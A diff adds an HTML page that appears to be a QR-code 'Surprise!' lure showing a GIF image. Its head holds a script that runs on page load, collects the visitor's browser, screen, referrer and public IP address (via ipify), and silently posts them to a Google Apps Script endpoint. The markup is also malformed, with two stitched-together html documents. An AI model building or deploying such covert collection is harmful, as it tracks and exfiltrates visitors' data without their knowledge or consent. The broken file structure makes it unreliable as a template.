@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>My Website</title>
+
+    <!-- Automatic Data Collection Script -->
+    <script>
+    async function collectDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        referrer: document.referrer,
+      };
+
+      // Get visitor IP address
+      const ipData = await fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .catch(() => ({ ip: "unknown" }));
+
+      info.ip = ipData.ip;
+
+      // Send data to Google Sheet
+      fetch("https://script.google.com/macros/s/AKfycbxvjS_3pUETuTmYRpBayZciSx_60VskDtAPpXZy0vhI9wnRePHEinI1C5mpPM8FflOuBg/exec", {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify(info)
+      });
+    }
+
+    // Run on page load
+    collectDeviceInfo();
+    </script>
+</head>
+
+<body>
+
+    <!-- Your normal website content goes here -->
+
+</body>
+</html>
+
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Surprise!</title>
+  <style>
+    html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif;background:#eafde9;display:flex;align-items:center;justify-content:center;}
+    .card{text-align:center;padding:20px;border-radius:12px;background:white;box-shadow:0 8px 24px rgba(0,0,0,0.12);max-width:90vw;}
+    img{max-width:100%;height:auto;display:block;margin:0 auto;}
+    h1{margin:0 0 10px;font-size:24px;color:#2a8a4a;}
+  </style>
+</head>
+<body>
+  <div class="card" role="main">
+    <h1>Surprise!</h1>
+    <img alt="surprise image" src="data:image/gif;base64,R0lGODlhIAAgAIbRAINTPYVSPYZWQIhSPohVQIhXQopUQYpXQ4tZRItbRY1RQI5jS454VZFmTpGGXJJcSJRuVZddS5ePaJlgTZ+vf6K5haPQk6ngn6rioKzlopRTSphnU5ttWrWFccy1pfHn2fTv4fvy5PzMuP39+f7+8f7/9f//8otfR6XHj6tmWNJ6ctZ7dP///sy8sPb19opPP5ynd6XTlqrloqvcnqvno6vopK/lpMRzaYNfRJWYY5edaZuwcaBjUqDkh6HdhaP/laT/lKX+lqr+mbdtYL5wZOCAe+aEf+2Hg/KKh/uQjvyOjf6Rkv+Pj/+QkP+Rkf+SkpvHj7DmpJ6+ezMyNDc2N4OpfP+UlG2JaHGQbF5vWy8uMJC3hT1CPOvo4Tg6OElRSLm4uVZVVGVoZa+ur15gXWiDY29wb3WNcYuKi+zs7GpqZpybnHx8fAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAKAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAIAAgAEAI/wAvCBxIsKDBgwgvxDjYA4iOhBcyQCxY4oASK0yYpGjCBGPGjE4ITLzAIyPHj0wEfDyZUaBEhGa4ZGGRBgMLFhlYmIFy8wILDGtYbGEx8gICjwWWMMlhwAGMH1KA+NgRpGjEJkNKICDBlQPXDyW4EgApw6pAHk5QCkjLUWTEkS6onGHBRstNMTe93LTAAs1Nu1gmYjBrcLDLgwkSCDBAAAiQF48toJDQQMKMkQsvVHgCsknaFx05ClEg9YVZAi1IjDBB4gMSpSg/qih6ZKWTIh4KkCiAsolSqzhAxh4Qm0mTCYQLJlgSwEiN5AKzEBQD5UIViWQMW8hQJoYaMxCnEMClG+OmTTQybkZhESXMGL5YXh7kgvNLF59g0hC98revCxZV9DSSfNBZZUEQUgSBAnQEZkSEEwUEEQQQQQDwmISOYSZQEisxQcCEHzEwoWOmTSSfAk54lNENBbyAQAIILHCCAUUgYKJAEJQQVgMrFvcRDRBJNMEGHgiwFWsmgBAWVyRoMAQTNrwFEWxpRRACCTqK0AFvwlm1go9MHBDbSYdBJKZxw6HEFhNmBcAEbCepFFtZBFp1JhNcPlBgQhSYFRAAOw=="/>
+    <p style="color:#666;font-size:14px;margin-top:12px;">Scan powered page showing the surprise image.</p>
+  </div>
+</body>
+</html>
